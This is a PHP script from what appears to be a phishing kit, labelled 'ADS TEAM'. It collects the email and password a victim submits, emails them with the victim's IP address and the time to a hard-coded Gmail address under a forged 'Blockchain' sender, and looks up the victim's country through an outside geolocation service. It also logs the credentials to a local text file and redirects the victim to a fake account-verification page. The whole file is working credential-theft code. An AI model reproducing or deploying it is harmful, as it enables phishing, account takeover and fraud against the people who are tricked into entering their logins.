<?php


/*========== [ Variables ]==========*/
$ip 		= getenv("REMOTE_ADDR");
$email   = $_POST['email'];
$pass   = $_POST['pass'];
$today = date("F j, Y, g:i a");
/*========== [ Variables ]==========*/


$message = "TERBAIK
====💲💲💲==== 💰💰💰 ADS TEAM 💰💰💰=====💲💲💲====
Email      : $email
Sandi      : $pass
IP	       : $ip
DAY	       : $today
====💲💲💲==== 💰💰💰 THANK'S YOU 💰💰💰=====💲💲💲====";


$to = "yakipdaris@gmail.com"; // Email Here
$subject = "ADS TEAM ACCOUNT = [$ip]";
$headers = "From: Blockchain <result.netnot@yandex.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

$file = "___________________________________________________DOKUMENTASI.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");
$host = "http://www.geoplugin.net/php.gp?ip=$ip";
$response = fetch($host);
$data = unserialize($response);
$a = $data['geoplugin_city'];
$b = $data['geoplugin_region'];
$c = $data['geoplugin_countryName'];
function fetch($host) {

		if ( function_exists('curl_init') ) {
						
			//use cURL to fetch data
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $host);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
			$response = curl_exec($ch);
			curl_close ($ch);
			
		} else if ( ini_get('allow_url_fopen') ) {
			
			//fall back to fopen()
			$response = file_get_contents($host, 'r');
			
		} else {

			trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
			return;
		
		}
		
		return $response;
	}

$handle = fopen($file, 'a');
fwrite($handle, "========================================");
fwrite($handle, "\n");
fwrite($handle, "::  Email         :: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "::  Sandi         :: ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "::  IP ADDRES     :: ");           
fwrite($handle, "$ip ");
fwrite($handle, "\n");
fwrite($handle, "::  JAM MASUK     :: ");     
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA        :: ");
fwrite($handle, "$c");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"confirm.html?ref=Account_verification_is_suspended\";
// -->
</script>";
?>